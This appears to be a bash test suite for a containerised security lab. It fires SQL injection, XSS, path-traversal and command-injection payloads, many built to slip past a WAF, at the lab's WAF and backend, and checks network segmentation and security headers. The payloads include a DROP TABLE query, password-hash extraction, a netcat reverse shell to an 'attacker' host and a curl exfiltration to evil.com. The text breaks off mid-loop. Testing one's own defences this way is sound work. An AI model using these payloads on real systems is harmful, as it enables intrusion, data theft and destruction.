#!/bin/bash

# ==========================================================
# === Comprehensive Security Testing Suite v2.0 ===
#
# This script performs a thorough security assessment including:
# - 10+ Sophisticated SQL Injection attempts (with WAF bypass)
# - 10+ Sophisticated XSS attempts (with WAF bypass)
# - Network Segmentation Tests (Management Network isolation)
# - Direct Backend Testing (bypassing WAF)
# - Additional security controls validation
#
# Author: Security Assessment Team
# Date: 2025-11-28
# ==========================================================

# Note: We intentionally do NOT use 'set -e' because:
# 1. ((var++)) returns 1 when var=0, which would cause premature exit
# 2. We want to continue testing even if some commands fail
# 3. We handle errors explicitly in our test logic

# ==============================================================================
# VULNERABILITY ANALYSIS (Summary)
# ==============================================================================
# 1. Source Code Analysis (app.py):
#    - Uses parameterized queries with PyMySQL (%s placeholders) - SECURE
#    - BCrypt password hashing - SECURE  
#    - Server-side sessions - SECURE
#    - Host header validation via ALLOWED_HOST = "web.sun.dmz"
#    - Error templates may leak information via Jinja2's {{ error }} variable
#    - CAPTCHA implemented with secrets.compare_digest() - timing-attack resistant
#
# 2. Potential Vulnerabilities:
#    - Template injection if error messages are not sanitized
#    - Information leakage via verbose error responses
#    - Session fixation if session regeneration not done on login
#    - Username enumeration via timing differences
#
# 3. WAF Configuration Analysis:
#    - OWASP CRS with Paranoia Level 3 (high)
#    - Anomaly threshold: Inbound=10, Outbound=5
#    - Custom signup rate limiting (5 requests/60s, 10min ban)
#    - Blocks: Path traversal, XSS, SQLi basic patterns
#
# WAF EVASION STRATEGY:
# - Use case variations: sElEcT, SeLeCt
# - URL encoding: %27 for ', %22 for "
# - Double URL encoding: %2527 for '
# - Unicode/UTF-8 encoding: %u0027
# - Comment injection: /**/UNION/**/SELECT
# - Inline comments: UN/**/ION
# - Null byte injection: %00
# - HPP (HTTP Parameter Pollution)
# - Overlong UTF-8 sequences
# - Using equivalent functions: CHAR(39) for '
# ==============================================================================

# --- Configuration ---
ATTACKER_EXTERNAL="clab-security_lab-attacker_1"    # External attacker (Internet)
ATTACKER_INTERNAL="clab-security_lab-attacker_2"    # Internal attacker (Client network)
WAF_CONTAINER="clab-security_lab-reverse_proxy"     # WAF/Reverse Proxy
WEBSERVER_CONTAINER="clab-security_lab-web_server"  # Backend webserver
SIEM_CONTAINER="clab-security_lab-siem"             # SIEM (Management network)
DATABASE_CONTAINER="clab-security_lab-database"     # Database (for mgmt test)

# IP Addresses
WAF_IP="10.10.10.3"
WAF_MGMT_IP="10.10.60.2"
WEBSERVER_IP="10.10.10.4"
WEBSERVER_MGMT_IP="10.10.60.3"

# URLs
WAF_URL="https://${WAF_IP}"
WAF_MGMT_URL="https://${WAF_MGMT_IP}"
WEBSERVER_DIRECT_URL="http://${WEBSERVER_IP}"
CORRECT_HOST="web.sun.dmz"

# Test options
CURL_OPTS="-s -k --connect-timeout 5 --max-time 10"
WGET_OPTS="--no-check-certificate -T 5 -t 1"

# --- Colors ---
GREEN="\033[0;32m"
RED="\033[0;31m"
YELLOW="\033[0;33m"
BLUE="\033[0;34m"
CYAN="\033[0;36m"
NC="\033[0m"

# --- Counters ---
TOTAL_TESTS=0
PASSED_TESTS=0
FAILED_TESTS=0
BLOCKED_BY_WAF=0
NOT_BLOCKED=0

# --- Helper Functions ---
print_header() {
    echo ""
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}  $1${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════════${NC}"
}

print_subheader() {
    echo ""
    echo -e "${BLUE}--- $1 ---${NC}"
}

log_test() {
    local test_name="$1"
    local result="$2"
    local expected="$3"
    local details="$4"
    
    TOTAL_TESTS=$((TOTAL_TESTS + 1))
    
    if [ "$result" == "PASS" ]; then
        PASSED_TESTS=$((PASSED_TESTS + 1))
        echo -e "  [${GREEN}PASS${NC}] $test_name"
    elif [ "$result" == "BLOCKED" ]; then
        BLOCKED_BY_WAF=$((BLOCKED_BY_WAF + 1))
        PASSED_TESTS=$((PASSED_TESTS + 1))
        echo -e "  [${GREEN}BLOCKED${NC}] $test_name - WAF correctly blocked attack"
    elif [ "$result" == "NOTBLOCKED" ]; then
        NOT_BLOCKED=$((NOT_BLOCKED + 1))
        if [ "$expected" == "should_block" ]; then
            FAILED_TESTS=$((FAILED_TESTS + 1))
            echo -e "  [${RED}FAIL${NC}] $test_name - WAF did NOT block attack!"
        else
            PASSED_TESTS=$((PASSED_TESTS + 1))
            echo -e "  [${YELLOW}WARN${NC}] $test_name - Attack reached backend (testing backend resilience)"
        fi
    else
        FAILED_TESTS=$((FAILED_TESTS + 1))
        echo -e "  [${RED}FAIL${NC}] $test_name"
    fi
    
    if [ -n "$details" ]; then
        echo -e "         ${YELLOW}Details: $details${NC}"
    fi
}

# Check if attack was blocked by WAF (403 Forbidden)
check_waf_block() {
    local response="$1"
    if echo "$response" | grep -qiE "403|Forbidden|blocked|ModSecurity|Access Denied"; then
        return 0  # Was blocked
    fi
    return 1  # Was NOT blocked
}

# Check HTTP status code
get_http_status() {
    local response="$1"
    echo "$response" | head -1 | grep -oE "[0-9]{3}" | head -1
}

# ==============================================================================
# SECTION 1: SQL INJECTION TESTS (10+ Sophisticated Attempts)
# ==============================================================================
run_sqli_tests() {
    print_header "SECTION 1: SQL INJECTION TESTS (WAF Evasion Techniques)"
    
    # Array of SQLi payloads with descriptions
    # Format: "payload|description|encoding_type"
    declare -a SQLI_PAYLOADS=(
        # Basic SQLi (should be caught)
        "' OR '1'='1|Classic OR-based SQLi|none"
        "1 OR 1=1--|Comment-based SQLi|none"
        "' UNION SELECT NULL,NULL--|Basic UNION injection|none"
        
        # Case variation bypass
        "' oR '1'='1|Case variation bypass (oR)|none"
        "' UnIoN SeLeCt NULL--|Mixed case UNION|none"
        
        # Comment-based evasion
        "' OR/**/1=1--|Inline comment injection|none"
        "'/**/UNION/**/SELECT/**/NULL--|Comment-wrapped UNION|none"
        "' OR '1'/*comment*/='1|Mid-string comment|none"
        
        # URL encoding bypass
        "%27%20OR%20%271%27%3D%271|URL encoded OR injection|url"
        "%27%20UNION%20SELECT%20NULL%2CNULL--%20|URL encoded UNION|url"
        
        # Double URL encoding bypass (WAF may decode only once)
        "%252F%252A%252A%252FUNION%252F%252A%252A%252FSELECT|Double encoded UNION|double_url"
        "%2527%20OR%20%25271%2527%253D%25271|Double encoded OR|double_url"
        
        # Hex encoding bypass
        "' OR 0x313D31--|Hex-encoded 1=1|none"
        "' UNION SELECT 0x61646D696E--|Hex string 'admin'|none"
        
        # CHAR() function bypass
        "' OR CHAR(49)=CHAR(49)--|CHAR() function bypass|none"
        "' UNION SELECT CHAR(65,66,67)--|CHAR multi-byte|none"
        
        # Null byte injection
        "%00' OR '1'='1|Null byte prefix|url"
        "admin'%00--|Null byte terminator|url"
        
        # Time-based blind SQLi
        "' OR SLEEP(1)--|Time-based blind (SLEEP)|none"
        "' OR BENCHMARK(1000000,SHA1('test'))--|Benchmark blind|none"
        "'; WAITFOR DELAY '0:0:1'--|MSSQL waitfor (wrong DB but test WAF)|none"
        
        # Boolean-based blind SQLi
        "' AND 1=1--|Boolean true condition|none"
        "' AND 1=2--|Boolean false condition|none"
        "' AND SUBSTRING(username,1,1)='a'--|Substring extraction|none"
        
        # Second-order SQLi setup
        "admin'--|Second-order setup|none"
        
        # Stacked queries
        "'; DROP TABLE users;--|Stacked query (destructive)|none"
        "'; INSERT INTO users VALUES(999,'hacked',MD5('pw'))--|Stacked INSERT|none"
        
        # MySQL specific
        "' OR 1=1#|MySQL comment style|none"
        "admin'-- -|MySQL double-dash space|none"
        
        # Parameter pollution
        "1&id=1 OR 1=1|HTTP Parameter Pollution|hpp"
        
        # JSON/NoSQL style (shouldn't work on MySQL but test WAF detection)
        "{\"\$gt\":\"\"}|NoSQL injection attempt|json"
        
        # Advanced: Unicode normalization bypass
        "ʼ OR ʼ1ʼ=ʼ1|Unicode apostrophe|unicode"
    )
    
    local target_url="${WAF_URL}/signin"
    
    print_subheader "Testing SQLi against WAF (${target_url})"
    
    for payload_entry in "${SQLI_PAYLOADS[@]}"; do
        IFS='|' read -r payload description encoding <<< "$payload_entry"
        
        # Build the request based on encoding type
        case "$encoding" in
            "url")
                # Already URL encoded
                POST_DATA="username=${payload}&password=test123"
                ;;
            "double_url")
                # Double URL encoded - send as-is
                POST_DATA="username=${payload}&password=test123"
                ;;
            "hpp")
                # HTTP Parameter Pollution - add duplicate param
                POST_DATA="username=admin&username=${payload}&password=test123"
                ;;
            "json")
                # JSON payload in form field
                POST_DATA="username=${payload}&password=test123"
                ;;
            *)
                # Encode special characters for POST
                encoded_payload=$(echo -n "$payload" | sed 's/ /%20/g; s/'\''/%27/g; s/"/%22/g; s/#/%23/g; s/;/%3B/g')
                POST_DATA="username=${encoded_payload}&password=test123"
                ;;
        esac
        
        # Execute the request
        RESPONSE=$(docker exec $ATTACKER_EXTERNAL curl $CURL_OPTS -X POST \
            -H "Host: $CORRECT_HOST" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "$POST_DATA" \
            -w "\n%{http_code}" \
            "$target_url" 2>&1)
        
        HTTP_CODE=$(echo "$RESPONSE" | tail -1)
        BODY=$(echo "$RESPONSE" | sed '$d')
        
        if [ "$HTTP_CODE" == "403" ] || check_waf_block "$BODY"; then
            log_test "SQLi: $description" "BLOCKED" "should_block"
        else
            log_test "SQLi: $description" "NOTBLOCKED" "should_block" "HTTP $HTTP_CODE"
        fi
    done
}

# ==============================================================================
# SECTION 2: XSS TESTS (10+ Sophisticated Attempts)
# ==============================================================================
run_xss_tests() {
    print_header "SECTION 2: CROSS-SITE SCRIPTING (XSS) TESTS"
    
    declare -a XSS_PAYLOADS=(
        # Basic XSS (should be caught)
        "<script>alert(1)</script>|Basic script tag|none"
        "<img src=x onerror=alert(1)>|IMG onerror handler|none"
        "<svg onload=alert(1)>|SVG onload|none"
        
        # Case variation
        "<ScRiPt>alert(1)</sCrIpT>|Mixed case script|none"
        "<IMG SRC=x OnErRoR=alert(1)>|Mixed case onerror|none"
        
        # Event handler variations
        "<body onload=alert(1)>|Body onload|none"
        "<input onfocus=alert(1) autofocus>|Input onfocus autofocus|none"
        "<marquee onstart=alert(1)>|Marquee onstart|none"
        "<video><source onerror=alert(1)>|Video source onerror|none"
        "<details open ontoggle=alert(1)>|Details ontoggle|none"
        
        # URL encoding bypass
        "%3Cscript%3Ealert(1)%3C/script%3E|URL encoded script|url"
        "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E|URL encoded IMG|url"
        
        # Double URL encoding
        "%253Cscript%253Ealert(1)%253C/script%253E|Double URL encoded|double_url"
        
        # HTML entity encoding
        "&lt;script&gt;alert(1)&lt;/script&gt;|HTML entities|html_entity"
        "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;|Hex HTML entities|html_entity"
        "&#60;script&#62;alert(1)&#60;/script&#62;|Decimal HTML entities|html_entity"
        
        # JavaScript protocol
        "<a href=javascript:alert(1)>click|JavaScript protocol|none"
        "<a href='javascript:alert(1)'>|JS protocol quoted|none"
        "<a href=\"ja vascript:alert(1)\">|JS with space|none"
        "<a href=\"java&#x09;script:alert(1)\">|JS with tab entity|none"
        
        # Data URI
        "<a href=data:text/html,<script>alert(1)</script>>|Data URI XSS|none"
        "<object data=data:text/html,<script>alert(1)</script>>|Object data URI|none"
        
        # SVG-based XSS
        "<svg><script>alert(1)</script></svg>|SVG with script|none"
        "<svg><animate onbegin=alert(1)>|SVG animate onbegin|none"
        "<svg><set onbegin=alert(1)>|SVG set onbegin|none"
        
        # Template injection style
        "{{constructor.constructor('alert(1)')()}}|Angular template injection|template"
        '\${alert(1)}|Template literal injection|template'
        
        # Filter evasion with null bytes
        "<scr%00ipt>alert(1)</script>|Null byte in tag|none"
        "<script%00>alert(1)</script>|Null after tag|none"
        
        # Unicode variations
        "<script>alert(1)</script>|Full-width Unicode|unicode"
        "＜script＞alert(1)＜/script＞|Full-width brackets|unicode"
        
        # Polyglot XSS
        "jaVasCript:/*-/*\`/*\\'\`/*\"/**/(/* */oNcLiCk=alert() )//|Polyglot XSS|none"
        
        # Breaking out of attributes
        "\" onmouseover=\"alert(1)|Attribute breakout double|none"
        "' onmouseover='alert(1)|Attribute breakout single|none"
        
        # DOM-based XSS triggers
        "#<script>alert(1)</script>|Fragment-based XSS|none"
        
        # CSS injection (for older browsers/specific contexts)
        "<style>@import'http://evil.com/xss.css';</style>|CSS import|none"
        "<div style=\"background:url(javascript:alert(1))\">|CSS background JS|none"
        
        # Expression (IE specific - legacy test)
        "<div style=\"width:expression(alert(1))\">|CSS expression|none"
    )
    
    local target_url="${WAF_URL}/"
    
    print_subheader "Testing XSS against WAF (GET parameters)"
    
    for payload_entry in "${XSS_PAYLOADS[@]}"; do
        IFS='|' read -r payload description encoding <<< "$payload_entry"
        
        # Encode for URL
        case "$encoding" in
            "url"|"double_url")
                encoded_payload="$payload"
                ;;
            *)
                encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload" | sed 's/</%3C/g; s/>/%3E/g; s/"/%22/g; s/ /%20/g')
                ;;
        esac
        
        RESPONSE=$(docker exec $ATTACKER_EXTERNAL curl $CURL_OPTS \
            -H "Host: $CORRECT_HOST" \
            -w "\n%{http_code}" \
            "${target_url}?search=${encoded_payload}" 2>&1)
        
        HTTP_CODE=$(echo "$RESPONSE" | tail -1)
        BODY=$(echo "$RESPONSE" | sed '$d')
        
        if [ "$HTTP_CODE" == "403" ] || check_waf_block "$BODY"; then
            log_test "XSS: $description" "BLOCKED" "should_block"
        else
            log_test "XSS: $description" "NOTBLOCKED" "should_block" "HTTP $HTTP_CODE"
        fi
    done
    
    print_subheader "Testing XSS via POST (signup form)"
    
    # Test XSS in username field during signup
    for i in 0 2 5 10 15; do  # Test subset via POST
        payload_entry="${XSS_PAYLOADS[$i]}"
        IFS='|' read -r payload description encoding <<< "$payload_entry"
        
        encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload")
        
        RESPONSE=$(docker exec $ATTACKER_EXTERNAL curl $CURL_OPTS -X POST \
            -H "Host: $CORRECT_HOST" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            -d "username=${encoded_payload}&password=testtest&captcha_answer=000000" \
            -w "\n%{http_code}" \
            "${WAF_URL}/signup" 2>&1)
        
        HTTP_CODE=$(echo "$RESPONSE" | tail -1)
        
        if [ "$HTTP_CODE" == "403" ] || check_waf_block "$(echo "$RESPONSE" | sed '$d')"; then
            log_test "XSS POST: $description" "BLOCKED" "should_block"
        else
            log_test "XSS POST: $description" "NOTBLOCKED" "should_block" "HTTP $HTTP_CODE"
        fi
    done
}

# ==============================================================================
# SECTION 3: NETWORK SEGMENTATION TESTS
# ==============================================================================
run_network_segmentation_tests() {
    print_header "SECTION 3: NETWORK SEGMENTATION TESTS"
    
    print_subheader "Test: Webserver NOT accessible via Management Network"
    
    # Test from SIEM (10.10.60.5) trying to reach webserver (10.10.60.3) on port 80
    # This should fail - webserver should not serve HTTP from management interface
    
    echo -e "  Testing: SIEM (mgmt) -> Webserver (10.10.60.3:80)"
    RESPONSE=$(docker exec $SIEM_CONTAINER curl $CURL_OPTS \
        -H "Host: $CORRECT_HOST" \
        -w "%{http_code}" \
        "http://${WEBSERVER_MGMT_IP}/" 2>&1)
    
    HTTP_CODE=$(echo "$RESPONSE" | tail -c 4 | tr -d '\n')
    
    if [ "$HTTP_CODE" == "000" ] || [ -z "$HTTP_CODE" ] || echo "$RESPONSE" | grep -qiE "refused|timeout|unreachable|failed"; then
        log_test "Webserver HTTP on mgmt interface" "PASS" "" "Connection refused/blocked as expected"
    else
        log_test "Webserver HTTP on mgmt interface" "FAIL" "" "HTTP $HTTP_CODE - Should not be accessible!"
    fi
    
    # Test HTTPS on management interface
    echo -e "  Testing: SIEM (mgmt) -> Webserver HTTPS (10.10.60.3:443)"
    RESPONSE=$(docker exec $SIEM_CONTAINER curl $CURL_OPTS \
        -H "Host: $CORRECT_HOST" \
        -w "%{http_code}" \
        "https://${WEBSERVER_MGMT_IP}/" 2>&1)
    
    HTTP_CODE=$(echo "$RESPONSE" | tail -c 4 | tr -d '\n')
    
    if [ "$HTTP_CODE" == "000" ] || [ -z "$HTTP_CODE" ] || echo "$RESPONSE" | grep -qiE "refused|timeout|unreachable|failed"; then
        log_test "Webserver HTTPS on mgmt interface" "PASS" "" "Connection refused/blocked as expected"
    else
        log_test "Webserver HTTPS on mgmt interface" "FAIL" "" "HTTP $HTTP_CODE - Should not be accessible!"
    fi
    
    print_subheader "Test: WAF NOT accessible via Management Network"
    
    # Test from Database (10.10.60.4) trying to reach WAF (10.10.60.2) on ports 80/443
    echo -e "  Testing: Database (mgmt) -> WAF HTTP (10.10.60.2:80)"
    RESPONSE=$(docker exec $DATABASE_CONTAINER curl $CURL_OPTS \
        -w "%{http_code}" \
        "http://${WAF_MGMT_IP}/" 2>&1)
    
    HTTP_CODE=$(echo "$RESPONSE" | tail -c 4 | tr -d '\n')
    
    if [ "$HTTP_CODE" == "000" ] || [ -z "$HTTP_CODE" ] || echo "$RESPONSE" | grep -qiE "refused|timeout|unreachable|failed"; then
        log_test "WAF HTTP on mgmt interface" "PASS" "" "Connection refused/blocked as expected"
    else
        log_test "WAF HTTP on mgmt interface" "FAIL" "" "HTTP $HTTP_CODE - Should not be accessible!"
    fi
    
    echo -e "  Testing: Database (mgmt) -> WAF HTTPS (10.10.60.2:443)"
    RESPONSE=$(docker exec $DATABASE_CONTAINER curl $CURL_OPTS \
        -w "%{http_code}" \
        "https://${WAF_MGMT_IP}/" 2>&1)
    
    HTTP_CODE=$(echo "$RESPONSE" | tail -c 4 | tr -d '\n')
    
    if [ "$HTTP_CODE" == "000" ] || [ -z "$HTTP_CODE" ] || echo "$RESPONSE" | grep -qiE "refused|timeout|unreachable|failed"; then
        log_test "WAF HTTPS on mgmt interface" "PASS" "" "Connection refused/blocked as expected"
    else
        log_test "WAF HTTPS on mgmt interface" "FAIL" "" "HTTP $HTTP_CODE - Should not be accessible!"
    fi
    
    print_subheader "Test: Webserver only accessible through Reverse Proxy"
    
    # Direct access to webserver from external should fail
    echo -e "  Testing: External attacker -> Direct Webserver access"
    RESPONSE=$(docker exec $ATTACKER_EXTERNAL curl $CURL_OPTS \
        -H "Host: $CORRECT_HOST" \
        -w "%{http_code}" \
        "http://${WEBSERVER_IP}/" 2>&1)
    
    HTTP_CODE=$(echo "$RESPONSE" | tail -c 4 | tr -d '\n')
    
    # From external, direct webserver access should be blocked by firewall
    if [ "$HTTP_CODE" == "000" ] || echo "$RESPONSE" | grep -qiE "refused|timeout|unreachable|failed"; then
        log_test "Direct webserver access (external)" "PASS" "" "Firewall blocked direct access"
    else
        log_test "Direct webserver access (external)" "FAIL" "" "HTTP $HTTP_CODE - Direct access should be blocked!"
    fi
    
    # From internal attacker, direct webserver access should also be blocked
    echo -e "  Testing: Internal attacker -> Direct Webserver access"
    RESPONSE=$(docker exec $ATTACKER_INTERNAL curl $CURL_OPTS \
        -H "Host: $CORRECT_HOST" \
        -w "%{http_code}" \
        "http://${WEBSERVER_IP}/" 2>&1)
    
    HTTP_CODE=$(echo "$RESPONSE" | tail -c 4 | tr -d '\n')
    
    if [ "$HTTP_CODE" == "000" ] || echo "$RESPONSE" | grep -qiE "refused|timeout|unreachable|failed"; then
        log_test "Direct webserver access (internal)" "PASS" "" "Firewall blocked direct access"
    else
        log_test "Direct webserver access (internal)" "FAIL" "" "HTTP $HTTP_CODE - Direct access should be blocked!"
    fi
}

# ==============================================================================
# SECTION 4: BACKEND RESILIENCE TESTS (Bypass WAF, Test App Directly)
# ==============================================================================
run_backend_resilience_tests() {
    print_header "SECTION 4: BACKEND RESILIENCE TESTS (Direct from WAF)"
    echo -e "${YELLOW}Testing if webserver is resilient even when WAF is bypassed${NC}"
    echo -e "${YELLOW}These tests run from the WAF container directly to the backend${NC}"
    
    print_subheader "SQLi attacks directly against backend"
    
    declare -a CRITICAL_SQLI=(
        "' OR '1'='1"
        "' OR '1'='1' --"
        "' UNION SELECT NULL,password_hash FROM users--"
        "'; DROP TABLE users;--"
        "' AND 1=1 UNION SELECT username,password_hash FROM users--"
    )
    
    for payload in "${CRITICAL_SQLI[@]}"; do
        encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload" | sed 's/ /%20/g; s/'\''/%27/g')
        
        # Test from WAF directly to backend (bypassing WAF rules)
        RESPONSE=$(docker exec $WAF_CONTAINER curl -s --connect-timeout 5 \
            -H "Host: $CORRECT_HOST" \
            -X POST \
            -d "username=${encoded_payload}&password=test123" \
            "http://${WEBSERVER_IP}/signin" 2>&1)
        
        # Check if attack was successful (shouldn't show password hashes, admin data, etc.)
        if echo "$RESPONSE" | grep -qiE "password_hash|admin|root|select.*from|syntax error|mysql|mariadb"; then
            log_test "Backend SQLi: ${payload:0:30}..." "FAIL" "" "Backend vulnerable - data leaked!"
        else
            log_test "Backend SQLi: ${payload:0:30}..." "PASS" "" "Backend handled safely (parameterized queries)"
        fi
    done
    
    print_subheader "XSS attacks directly against backend"
    
    declare -a CRITICAL_XSS=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert(1)>"
        "{{constructor.constructor('alert(1)')()}}"
        "\" onmouseover=\"alert(1)"
    )
    
    for payload in "${CRITICAL_XSS[@]}"; do
        encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload")
        
        RESPONSE=$(docker exec $WAF_CONTAINER curl -s --connect-timeout 5 \
            -H "Host: $CORRECT_HOST" \
            "http://${WEBSERVER_IP}/?search=${encoded_payload}" 2>&1)
        
        # Check if payload is reflected unescaped
        if echo "$RESPONSE" | grep -qF "<script>alert" || echo "$RESPONSE" | grep -qF "onerror=alert"; then
            log_test "Backend XSS: ${payload:0:30}..." "FAIL" "" "Backend reflects XSS unescaped!"
        else
            log_test "Backend XSS: ${payload:0:30}..." "PASS" "" "Backend handled safely (output encoding or no reflection)"
        fi
    done
    
    print_subheader "Path Traversal directly against backend"
    
    declare -a PATH_TRAVERSAL=(
        "/../../../etc/passwd"
        "/....//....//....//etc/passwd"
        "/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
        "/..%252f..%252f..%252fetc/passwd"
    )
    
    for payload in "${PATH_TRAVERSAL[@]}"; do
        RESPONSE=$(docker exec $WAF_CONTAINER curl -s --connect-timeout 5 \
            -H "Host: $CORRECT_HOST" \
            "http://${WEBSERVER_IP}${payload}" 2>&1)
        
        if echo "$RESPONSE" | grep -qE "root:x:|daemon:|bin:"; then
            log_test "Backend Path Traversal: ${payload:0:30}..." "FAIL" "" "File disclosed!"
        else
            log_test "Backend Path Traversal: ${payload:0:30}..." "PASS" "" "Not vulnerable"
        fi
    done
    
    print_subheader "Host Header validation on backend"
    
    # Test backend's own host header validation
    RESPONSE=$(docker exec $WAF_CONTAINER curl -s --connect-timeout 5 \
        -H "Host: evil.attacker.com" \
        "http://${WEBSERVER_IP}/" 2>&1)
    
    HTTP_CODE=$(echo "$RESPONSE" | grep -oE "HTTP/[0-9.]+ [0-9]+" | grep -oE "[0-9]{3}" || echo "")
    
    if echo "$RESPONSE" | grep -qE "403|Forbidden" || [ -z "$(echo "$RESPONSE" | grep -i 'willkommen')" ]; then
        log_test "Backend Host Header validation" "PASS" "" "Rejects invalid Host header"
    else
        log_test "Backend Host Header validation" "FAIL" "" "Accepts arbitrary Host header!"
    fi
}

# ==============================================================================
# SECTION 5: ADDITIONAL SECURITY TESTS
# ==============================================================================
run_additional_tests() {
    print_header "SECTION 5: ADDITIONAL SECURITY TESTS"
    
    print_subheader "HTTP Method Testing"
    
    # Test dangerous HTTP methods
    for method in "PUT" "DELETE" "TRACE" "CONNECT" "PATCH" "OPTIONS"; do
        RESPONSE=$(docker exec $ATTACKER_EXTERNAL curl $CURL_OPTS -X "$method" \
            -H "Host: $CORRECT_HOST" \
            -w "%{http_code}" \
            "${WAF_URL}/" 2>&1)
        
        HTTP_CODE=$(echo "$RESPONSE" | tail -c 4 | tr -d '\n')
        
        if [ "$HTTP_CODE" == "405" ] || [ "$HTTP_CODE" == "403" ] || [ "$HTTP_CODE" == "501" ]; then
            log_test "HTTP $method method" "PASS" "" "Blocked with $HTTP_CODE"
        else
            log_test "HTTP $method method" "FAIL" "" "Allowed with $HTTP_CODE"
        fi
    done
    
    print_subheader "Security Headers Verification"
    
    HEADERS=$(docker exec $ATTACKER_EXTERNAL curl $CURL_OPTS -I \
        -H "Host: $CORRECT_HOST" \
        "${WAF_URL}/" 2>&1)
    
    # Check HSTS
    if echo "$HEADERS" | grep -qi "Strict-Transport-Security"; then
        log_test "HSTS Header" "PASS" ""
    else
        log_test "HSTS Header" "FAIL" "" "Missing Strict-Transport-Security"
    fi
    
    # Check X-Frame-Options
    if echo "$HEADERS" | grep -qi "X-Frame-Options"; then
        log_test "X-Frame-Options Header" "PASS" ""
    else
        log_test "X-Frame-Options Header" "FAIL" "" "Missing X-Frame-Options"
    fi
    
    # Check X-Content-Type-Options
    if echo "$HEADERS" | grep -qi "X-Content-Type-Options.*nosniff"; then
        log_test "X-Content-Type-Options Header" "PASS" ""
    else
        log_test "X-Content-Type-Options Header" "FAIL" "" "Missing X-Content-Type-Options"
    fi
    
    # Check CSP
    if echo "$HEADERS" | grep -qi "Content-Security-Policy"; then
        log_test "Content-Security-Policy Header" "PASS" ""
    else
        log_test "Content-Security-Policy Header" "FAIL" "" "Missing CSP"
    fi
    
    print_subheader "Rate Limiting Test (Signup Flood Protection)"
    
    echo -e "  Sending 10 rapid requests to /signup..."
    BLOCKED_COUNT=0
    for i in {1..10}; do
        RESPONSE=$(docker exec $ATTACKER_EXTERNAL curl $CURL_OPTS -X POST \
            -H "Host: $CORRECT_HOST" \
            -d "username=ratetest${i}&password=testtest&captcha_answer=000000" \
            -w "%{http_code}" \
            "${WAF_URL}/signup" 2>&1)
        
        HTTP_CODE=$(echo "$RESPONSE" | tail -c 4 | tr -d '\n')
        
        if [ "$HTTP_CODE" == "429" ] || [ "$HTTP_CODE" == "403" ] || [ "$HTTP_CODE" == "503" ]; then
            BLOCKED_COUNT=$((BLOCKED_COUNT + 1))
        fi
    done
    
    if [ $BLOCKED_COUNT -gt 0 ]; then
        log_test "Rate Limiting (signup flood)" "PASS" "" "$BLOCKED_COUNT/10 requests blocked"
    else
        log_test "Rate Limiting (signup flood)" "FAIL" "" "No rate limiting detected"
    fi
    
    print_subheader "HTTPS Enforcement Test"
    
    # Test HTTP redirect to HTTPS
    RESPONSE=$(docker exec $ATTACKER_EXTERNAL curl -s -I --max-redirs 0 \
        -H "Host: $CORRECT_HOST" \
        "http://${WAF_IP}/" 2>&1)
    
    if echo "$RESPONSE" | grep -qE "301|302|307|308" && echo "$RESPONSE" | grep -qi "Location:.*https"; then
        log_test "HTTP to HTTPS redirect" "PASS" ""
    else
        log_test "HTTP to HTTPS redirect" "FAIL" "" "Not redirecting to HTTPS"
    fi
    
    print_subheader "Cookie Security Test"
    
    # Login and check cookie flags
    RESPONSE=$(docker exec $ATTACKER_EXTERNAL curl $CURL_OPTS -c - -X POST \
        -H "Host: $CORRECT_HOST" \
        -d "username=testuser&password=Test1234" \
        "${WAF_URL}/signin" 2>&1)
    
    if echo "$RESPONSE" | grep -qi "HttpOnly" && echo "$RESPONSE" | grep -qi "Secure"; then
        log_test "Cookie Security Flags" "PASS" "" "HttpOnly and Secure flags set"
    elif echo "$RESPONSE" | grep -qi "session"; then
        log_test "Cookie Security Flags" "FAIL" "" "Missing security flags on session cookie"
    else
        log_test "Cookie Security Flags" "PASS" "" "No session cookie in response (expected for failed login)"
    fi
    
    print_subheader "Information Leakage Tests"
    
    # Check for server version disclosure
    HEADERS=$(docker exec $ATTACKER_EXTERNAL curl $CURL_OPTS -I \
        -H "Host: $CORRECT_HOST" \
        "${WAF_URL}/" 2>&1)
    
    if echo "$HEADERS" | grep -qiE "Server:.*nginx/[0-9]|X-Powered-By|X-AspNet"; then
        log_test "Server Version Disclosure" "FAIL" "" "Server version exposed in headers"
    else
        log_test "Server Version Disclosure" "PASS" "" "Server version hidden or generic"
    fi
    
    # Check error page information leakage
    RESPONSE=$(docker exec $ATTACKER_EXTERNAL curl $CURL_OPTS \
        -H "Host: $CORRECT_HOST" \
        "${WAF_URL}/nonexistent_page_12345" 2>&1)
    
    if echo "$RESPONSE" | grep -qiE "traceback|stacktrace|exception|debug|werkzeug"; then
        log_test "Error Page Information Leakage" "FAIL" "" "Debug info in error pages"
    else
        log_test "Error Page Information Leakage" "PASS" "" "Error pages are safe"
    fi
}

# ==============================================================================
# SECTION 6: COMMAND INJECTION TESTS
# ==============================================================================
run_command_injection_tests() {
    print_header "SECTION 6: COMMAND INJECTION TESTS"
    
    declare -a CMD_PAYLOADS=(
        "; ls -la|Basic semicolon injection"
        "| cat /etc/passwd|Pipe injection"
        "\$(whoami)|Command substitution"
        "\`whoami\`|Backtick injection"
        "; sleep 5|Time-based blind"
        "|| ls|OR operator"
        "&& ls|AND operator"
        "| nc -e /bin/sh attacker 4444|Reverse shell attempt"
        "; curl http://evil.com/\$(whoami)|Data exfiltration"
        "%0als|Null byte line injection"
    )
    
    for payload_entry in "${CMD_PAYLOADS[@]}"; do
        IFS='|' read -r payload description <<< "$payload_entry"
        
        encoded_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload")
        
        RESPONSE=$(docker exec $ATTACKER_EXTERNAL curl $CURL_OPTS \
            -H "Host: $CORRECT_HOST" \
            -w "\n%{http_code}" \
            "${WAF_URL}/?cmd=${encoded_payload}" 2>&1)
        
